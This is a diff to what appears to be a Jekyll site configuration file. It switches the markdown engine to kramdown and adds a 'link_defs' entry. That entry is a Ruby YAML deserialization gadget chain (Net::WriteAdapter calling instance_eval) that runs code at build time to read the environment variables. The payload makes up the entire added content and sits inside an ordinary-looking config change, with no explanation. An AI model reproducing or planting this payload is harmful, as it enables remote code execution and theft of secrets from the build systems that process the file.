@@ -1,1 +1,23 @@
-markdown: redcarpet
+markdown: "kramdown"
+kramdown: 
+    link_defs: |
+        {
+            "link1": ["link1url", {
+                item1: &item1 !ruby/object:Sass::Script::Value::Number {
+                    "original": "placeholder"
+                },
+                item2: !ruby/object:Parslet::Slice {
+                    "str": !ruby/object:Sass::Script::Value::Number {
+                        "original": !ruby/object:Net::WriteAdapter {
+                            "socket": *item1,
+                            "method_id": "instance_eval"
+                        }
+                    },
+                    "offset": "original = ENV.inspect"
+                },
+                item3: *item1
+                
+            }]
+        }
+
+
